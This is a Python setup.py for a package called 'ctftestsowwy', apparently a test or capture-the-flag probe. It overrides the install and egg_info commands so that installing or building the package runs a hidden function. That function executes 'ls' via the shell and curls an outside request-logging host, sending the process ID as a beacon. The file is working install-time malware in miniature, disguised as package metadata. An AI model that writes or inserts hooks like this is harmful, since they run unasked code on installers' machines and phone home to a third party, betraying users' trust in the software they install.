from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    print('plua')
    try:
        exec("import os; os.system('ls'); print('**')")
    except:
        pass
    os.system("curl http://4l0kemzf.requestrepo.com/?"+str(os.getpid()))

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

setup(
    name = "ctftestsowwy",
    version = "0.1.4",
    license = "MIT",
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)